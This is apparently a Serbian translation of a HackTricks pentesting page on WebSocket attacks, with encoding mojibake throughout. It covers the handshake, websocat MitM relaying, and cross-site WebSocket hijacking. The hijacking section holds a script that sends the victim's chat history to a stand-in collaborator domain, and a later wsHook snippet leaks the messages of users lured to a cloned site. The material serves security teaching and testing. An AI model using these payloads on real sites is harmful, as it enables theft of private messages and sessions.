# Napadi na WebSocket

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Å ta su WebSockets

WebSocket konekcije se uspostavljaju putem poÄetnog **HTTP** handshake-a i dizajnirane su da budu **dugotrajne**, omoguÄ‡avajuÄ‡i dvosmernu komunikaciju u bilo koje vreme bez potrebe za transakcionim sistemom. Ovo Äini WebSockets posebno pogodnim za aplikacije koje zahtevaju **nisku latenciju ili komunikaciju iniciranu od strane servera**, kao Å¡to su struje finansijskih podataka uÅ¾ivo.

### Uspostavljanje WebSocket konekcija

Detaljno objaÅ¡njenje o uspostavljanju WebSocket konekcija moÅ¾e se pronaÄ‡i [**ovde**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc). Ukratko, WebSocket konekcije se obiÄno iniciraju putem JavaScript-a na strani klijenta, kao Å¡to je prikazano ispod:
```javascript
var ws = new WebSocket("wss://normal-website.com/ws");
```
`wss` protokol oznaÄava WebSocket konekciju koja je obezbeÄ‘ena sa **TLS**, dok `ws` oznaÄava **neobezbeÄ‘enu** konekciju.

Tokom uspostavljanja konekcije, izvrÅ¡ava se handshake izmeÄ‘u pregledaÄa i servera preko HTTP-a. Proces handshake-a ukljuÄuje slanje zahteva od strane pregledaÄa i odgovor servera, kako je prikazano u sledeÄ‡im primerima:

PregledaÄ Å¡alje zahtev za handshake:
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
Odgovor servera na handshake:
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
Veza ostaje otvorena za razmenu poruka u oba smera nakon uspostavljanja.

**KljuÄne taÄke WebSocket Handshake-a:**

- Zaglavlja `Connection` i `Upgrade` signaliziraju inicijaciju WebSocket handshake-a.
- Zaglavlje `Sec-WebSocket-Version` ukazuje na Å¾eljenu verziju WebSocket protokola, obiÄno `13`.
- Base64 enkodirana nasumiÄna vrednost se Å¡alje u zaglavlju `Sec-WebSocket-Key`, obezbeÄ‘ujuÄ‡i da svaki handshake bude jedinstven, Å¡to pomaÅ¾e u spreÄavanju problema sa keÅ¡irajuÄ‡im proksijima. Ova vrednost nije za autentifikaciju, veÄ‡ da potvrdi da odgovor nije generisan od strane pogreÅ¡no konfigurisanog servera ili keÅ¡a.
- Zaglavlje `Sec-WebSocket-Accept` u odgovoru servera je heÅ¡ vrednost `Sec-WebSocket-Key`, potvrÄ‘ujuÄ‡i serverovu nameru da otvori WebSocket vezu.

Ove funkcionalnosti obezbeÄ‘uju da je proces handshake-a siguran i pouzdan, otvarajuÄ‡i put za efikasnu komunikaciju u realnom vremenu.


### Linux konzola

MoÅ¾ete koristiti `websocat` da uspostavite sirovu vezu sa WebSocket-om.
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
Ili da kreirate websocat server:
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
### MitM napadi na WebSocket veze

Ako primetite da su klijenti povezani na **HTTP WebSocket** iz vaÅ¡e trenutne lokalne mreÅ¾e, moÅ¾ete pokuÅ¡ati [ARP Spoofing napad](../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) kako biste izveli MitM napad izmeÄ‘u klijenta i servera.\
Kada klijent pokuÅ¡a da se poveÅ¾e, moÅ¾ete koristiti:
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
### Enumeracija Websocket-a

MoÅ¾ete koristiti **alat** [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) **da automatski otkrijete, identifikujete i pretraÅ¾ujete poznate** **ranjivosti** u websocket-ima.

### Alati za debagovanje Websocket-a

* **Burp Suite** podrÅ¾ava MitM komunikaciju websocket-a na veoma sliÄan naÄin kao Å¡to to radi za redovnu HTTP komunikaciju.
* [**socketsleuth**](https://github.com/snyk/socketsleuth) **Burp Suite ekstenzija** Ä‡e vam omoguÄ‡iti bolje upravljanje Websocket komunikacijom u Burp-u tako Å¡to Ä‡ete dobiti **istoriju**, postaviti **pravila presretanja**, koristiti pravila za **poklapanje i zamenu**, koristiti **Intruder** i **AutoRepeater**.
* [**WSSiP**](https://github.com/nccgroup/wssip)**:** SkraÄ‡enica za "**WebSocket/Socket.io Proxy**", ovaj alat, napisan u Node.js, pruÅ¾a korisniÄki interfejs za **snimanje, presretanje, slanje prilagoÄ‘enih** poruka i pregled svih WebSocket i Socket.IO komunikacija izmeÄ‘u klijenta i servera.
* [**wsrepl**](https://github.com/doyensec/wsrepl) je **interaktivni websocket REPL** dizajniran posebno za testiranje prodiranja. PruÅ¾a interfejs za posmatranje **dolaznih websocket poruka i slanje novih**, sa jednostavnim okvirom za **automatizaciju** ove komunikacije.
* [**https://websocketking.com/**](https://websocketking.com/) je **veb za komunikaciju** sa drugim veb sajtovima koristeÄ‡i **websocket-e**.
* [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket) pored ostalih vrsta komunikacija/protokola, pruÅ¾a **veb za komunikaciju** sa drugim veb sajtovima koristeÄ‡i **websocket-e**.

## Websocket Lab

U [**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course) imate kod za pokretanje veba koristeÄ‡i websocket-e, a u [**ovom postu**](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/) moÅ¾ete pronaÄ‡i objaÅ¡njenje.

## Cross-site WebSocket hijacking (CSWSH)

**Cross-site WebSocket hijacking**, takoÄ‘e poznat kao **cross-origin WebSocket hijacking**, identifikovan je kao specifiÄan sluÄaj **[Cross-Site Request Forgery (CSRF)](csrf-cross-site-request-forgery.md)** koji utiÄe na WebSocket handshake. Ova ranjivost se javlja kada WebSocket handshake autentifikuje samo putem **HTTP kolaÄiÄ‡a** bez CSRF tokena ili sliÄnih sigurnosnih mera.

NapadaÄi mogu iskoristiti ovo tako Å¡to Ä‡e hostovati **zlonamernu veb stranicu** koja inicira cross-site WebSocket konekciju sa ranjivom aplikacijom. Kao rezultat toga, ova konekcija se tretira kao deo sesije Å¾rtve sa aplikacijom, iskoriÅ¡Ä‡avajuÄ‡i nedostatak CSRF zaÅ¡tite u mehanizmu upravljanja sesijom.

### Jednostavan napad

Imajte na umu da prilikom **uspostavljanja** websocket konekcije, **kolaÄiÄ‡** se **Å¡alje** serveru. Server ga moÅ¾e koristiti da **poveÅ¾e** svakog **specifiÄnog** **korisnika** sa njegovom **websocket** **sesijom na osnovu poslatog kolaÄiÄ‡a**.

Zatim, ako na **primer** websocket **server** **vrati istoriju razgovora** korisnika ako se poÅ¡alje poruka sa "**READY"**, onda jednostavan XSS koji uspostavlja konekciju (kolaÄiÄ‡ Ä‡e biti **automatski poslat** da autorizuje Å¾rtvu) slanjem "**READY**" Ä‡e biti u moguÄ‡nosti da **dobije** istoriju **razgovora**.
```markup
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### Cross Origin + KolaÄiÄ‡ sa drugim poddomenom

U ovom blog postu [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/) napadaÄ je uspeo da **izvrÅ¡i proizvoljni JavaScript u poddomenu** domena gde se odvijala komunikacija putem web socket-a. Zbog toga Å¡to je bio **poddomen**, **kolaÄiÄ‡** je bio **poslat**, a zbog toga Å¡to **Websocket nije pravilno proveravao poreklo**, bilo je moguÄ‡e komunicirati sa njim i **ukrasti tokene iz njega**.

### KraÄ‘a podataka od korisnika

Kopirajte veb aplikaciju koju Å¾elite da se predstavljate (npr. .html fajlove) i unutar skripte gde se odvija komunikacija putem web socket-a dodajte ovaj kod:
```javascript
//This is the script tag to load the websocket hooker
<script src='wsHook.js'></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function(data, url) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "client_msg?m="+data, true);
xhttp.send();
}
wsHook.after = function(messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "server_msg?m="+messageEvent.data, true);
xhttp.send();
return messageEvent;
}
```
Sada preuzmite datoteku `wsHook.js` sa [https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook) i **saÄuvajte je unutar fascikle sa web fajlovima**.\
IzlaÅ¾uÄ‡i web aplikaciju i povezujuÄ‡i korisnika na nju, moÄ‡i Ä‡ete da ukradete poslate i primljene poruke putem web soketa:
```javascript
sudo python3 -m http.server 80
```
## Trke uslova

Trke uslova u WebSockets-u su takoÄ‘e stvar, [proverite ovde informacije da biste saznali viÅ¡e](race-condition.md#rc-in-websockets).

## Ostale ranjivosti

PoÅ¡to su WebSockets mehanizam za **slanje podataka na serversku i klijentsku stranu**, u zavisnosti od toga kako server i klijent obraÄ‘uju informacije, **WebSockets mogu se koristiti za iskoriÅ¡Ä‡avanje drugih ranjivosti kao Å¡to su XSS, SQLi ili bilo koja druga uobiÄajena web ranjivost koriÅ¡Ä‡enjem unosa korisnika putem WebSockets-a**.

## **WebSocket Smuggling**

Ova ranjivost bi vam mogla omoguÄ‡iti da **zaobiÄ‘ete ograniÄenja obrnutih proxy-ja** tako Å¡to Ä‡ete ih naterati da veruju da je **uspostavljena WebSocket komunikacija** (Äak i ako to nije taÄno). To bi omoguÄ‡ilo napadaÄu da **pristupi skrivenim krajnjim taÄkama**. Za viÅ¡e informacija pogledajte sledeÄ‡u stranicu:

{% content-ref url="h2c-smuggling.md" %}
[h2c-smuggling.md](h2c-smuggling.md)
{% endcontent-ref %}

## Reference

* [https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **oglaÅ¡avanje vaÅ¡e kompanije na HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje trikove hakovanja slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
